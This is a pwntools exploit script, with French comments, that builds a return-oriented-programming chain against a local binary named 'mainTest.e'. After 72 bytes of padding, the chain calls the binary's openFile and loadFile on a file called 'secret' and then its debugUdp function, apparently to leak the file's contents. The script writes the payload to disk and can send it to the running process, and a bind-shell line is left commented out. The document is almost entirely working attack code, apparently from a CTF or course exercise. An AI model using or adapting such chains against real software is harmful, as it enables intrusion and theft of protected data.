from pwn import *

context.clear(arch='x86_64')


elf=ELF('mainTest.e')
#shellcode = shellcraft.amd64.bindsh(


context.kernel = 'x86_64'
rop=ROP(elf,elf.address)

gadpoprdx=0x41934a #pop rdx ; ret
gadpoprdi=0x414d55 #pop rdi ; ret
gadmovrdirax=0x423d4b #mov rdi, rax ; call rdx

#appel fopen avec le fichier "secret"
rop.raw(gadpoprdi)#pop rdi; ret
rop.raw(0x426da8)#string 'secret'
rop.raw(rop.resolve('openFile'))
rop.raw(gadpoprdx)#pop rdx ; ret
rop.raw(gadpoprdx)#pop rdx ; ret
rop.raw(gadmovrdirax)#mov rdi, rax ; call rdx
#appel de loadFile
rop.raw(rop.resolve('loadFile'))
#chargement du 1er parametre de display
rop.raw(gadpoprdx)#pop rdx ; ret
rop.raw(gadpoprdx)#pop rdx ; ret
rop.raw(gadmovrdirax)#mov rdi, rax ; call rdx
rop.raw(rop.resolve('debugUdp'))

def genpayload(pad):

	f = open("payload","w")
	payload = rop.generatePadding(0,pad)+bytes(rop)+'\n'
	f.write(payload)
	f.close()

genpayload(72)



def run(pad):
	p = elf.process(['8888'])
	p.send(rop.generatePadding(0,pad)+bytes(rop))
	time.sleep(1)
	p.interactive()
	return p

def showasm(addr,count):
	print disasm(elf.read(addr,count))

#a = run()
